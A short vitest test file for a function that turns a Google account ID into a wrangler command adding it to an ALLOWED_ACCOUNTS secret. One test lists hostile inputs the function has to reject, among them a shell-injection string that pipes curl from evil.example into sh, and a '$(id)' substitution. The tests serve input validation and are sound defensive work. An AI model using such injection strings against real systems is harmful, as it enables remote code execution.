import { describe, expect, it } from 'vitest';
import { admitCommand } from './admit';

describe('admitCommand', () => {
  it('puts a Google account ID into the command that admits it', () => {
    expect(admitCommand('104729384756102938475')).toBe(
      "echo '104729384756102938475' | npx wrangler secret put ALLOWED_ACCOUNTS"
    );
  });

  it('builds nothing from an ID a crafted link could have chosen', () => {
    for (const hostile of ["1'; curl evil.example | sh; echo '", '1 2', '1\n2', '$(id)', 'abc', '', null]) {
      expect(admitCommand(hostile)).toBeNull();
    }
  });
});
